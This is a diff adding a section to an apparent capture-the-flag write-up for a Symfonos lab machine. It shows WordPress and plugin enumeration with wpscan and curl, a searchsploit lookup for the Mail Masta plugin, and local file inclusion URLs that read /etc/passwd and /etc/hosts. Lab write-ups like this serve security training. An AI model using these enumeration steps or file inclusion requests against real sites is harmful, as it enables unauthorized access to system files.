@@ -139,6 +139,35 @@ gobuster dir -u http://192.168.1.206/h3l105/ -w /usr/share/SecLists/Discovery/We
 ![image](https://github.com/user-attachments/assets/5080b808-1a03-4fdd-ac98-a5005769976e)
 
 
+#### **we apply a word press recognition**
+```bash
+wpscan --url http://192.168.1.206/h3l105/ --enumerate u,vp
+```
+![image](https://github.com/user-attachments/assets/71a8e804-5bc2-465a-a273-2c679e15acdc)
+![image](https://github.com/user-attachments/assets/4029f662-4962-48ce-a0a8-d3c8ae1b8872)
+![image](https://github.com/user-attachments/assets/08fed5f8-d0c7-4ec3-bc13-1856e18259b4)
+
+#### **we didn't find anything, but let's remember that when reviewing the source code of the web site we could see some plugins**
+![image](https://github.com/user-attachments/assets/85f2eade-4728-42a4-82b5-f94825b4aa67)
+
+#### **now from the console we will make a call to the web to make an analysis and we can extract more info.**
+```bash
+curl -s -X GET "http://192.168.1.206/h3l105/" | grep "wp-content" |grep -oP "'.*?'" | grep "symfonos.local" | cut -d '/' -f 1-7 | sort -u | grep plugins
+```
+![image](https://github.com/user-attachments/assets/e112d048-8406-4dc8-94ac-d5625cff123d)
+
+#### **we look for possible exploits**
+```bash
+searchsploit mail masta
+```
+![image](https://github.com/user-attachments/assets/07d78f62-c6af-4322-b7f9-3374c2b38f4a)
+```bash
+searchxploit -x php/webapps/40290.txt
+```
+http://192.168.1.206/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
+![image](https://github.com/user-attachments/assets/614a157b-3fc7-425c-b946-c2e652ea5cc9)
+http://192.168.1.206/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/hosts
+![image](https://github.com/user-attachments/assets/f75129aa-8b8f-45ca-ab56-bffd87eea826)
 
 
 
